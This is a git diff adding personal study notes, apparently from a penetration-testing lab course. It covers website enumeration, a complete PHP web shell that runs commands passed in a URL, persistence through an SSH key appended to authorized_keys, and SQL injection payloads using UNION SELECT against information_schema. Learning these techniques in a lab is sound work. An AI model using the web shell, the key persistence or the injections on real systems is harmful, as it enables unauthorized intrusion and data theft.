@@ -78,5 +78,130 @@ print ('Authors: ',authors)
 ```
 #### Uses Python to scrape webpage at domain for certain HTML element
 
-## Nmap Scripting Engine
+### Nmap Scripting Engine
 ```proxychains nmap -T4 --script=banner=http-enum 192.168.28.100 -p80```
+
+## Day 2
+
+### Webdev stuff I learned back in HS, javascript, lookin in html, the works.
+
+### Enumerate website
+
+/uploads
+/chat
+/cmdinjection
+/java
+/path
+/webexample
+/cross
+/
+
+From surfing:
+ * index.html
+      Has styles in head, fileUpload.php button at the top and db_recover.php button at the bottom of the page.
+      folders on interest
+      /icons
+      /uploads -->  Provides a shell
+
+      ssh-keygen
+      echo "your key" >> currentuser directory/.ssh/authorized keys
+      check with ls -la and cat
+      ### Allows for logging in without password
+
+      uploading malicious php files will allow for launching a web shell
+   
+```
+  <HTML>
+  <BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+```
+
+# Day 3
+
+   ## MYSQL
+
+   
+   ### Default Databases
+
+   
+   information_schema
+  
+   mysql
+  
+   performance_schema
+
+   ### Commands
+
+
+   #### Syntax
+
+   
+   Terminate each line w a semicolon
+   
+   select * from (DB) - gets data from db
+   
+   union - combine 2 or more select statements
+   
+   use - select a db
+   
+   update - updates a db
+
+   show table - shows a table
+
+   #### Examples
+   
+   ```select username,passwd,studentID from session.userinfo ;```
+
+   ```select name,cost,color from session.car ;```
+
+   ```UNION SELECT type,2,cost,color,year from session.car #```
+   
+   ```UNION SELECT carid,2,type,name,year from session.car #```
+
+   #### Golden Statement:
+   
+   ```select table_schema,table_name,column_name from information_schema.columns ;```
+   
+   ```UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #```
+
+   ## SQL Injection
+   
+   ![image](https://github.com/user-attachments/assets/88a665f1-ed46-4782-beff-a91ba3ed9357)
+
+
+   Paste into both fields to find vulnerable input box
+   ```' or 1='1```
+
+   ![image](https://github.com/user-attachments/assets/68bd1ec1-e920-4b5d-8804-5f407acf589c)
+
+   Inspect element and navigate to the Network tab, then click on the POST packet 
+
+   ![image](https://github.com/user-attachments/assets/e58a3ded-9837-4e32-bd1a-554cf89207d6)
+
+
+   ![image](https://github.com/user-attachments/assets/0b3ebd4c-d314-411e-9445-58e06c4b1d13)
+
+
+   In the POST packet, look to the right and click raw to view the string to make your query
+
+   ![image](https://github.com/user-attachments/assets/28c8ec91-2666-4dd7-9911-e2e5e5e7ec4a)
+
+<hr>
+
+   ##
+
+
+   UNION SELECT type,2,cost,color,year from session.car #
+   UNION SELECT carid,2,type,name,year from session.car #
+ #Place ? at end of (url).php to make it a query then add string, should return wanted info array
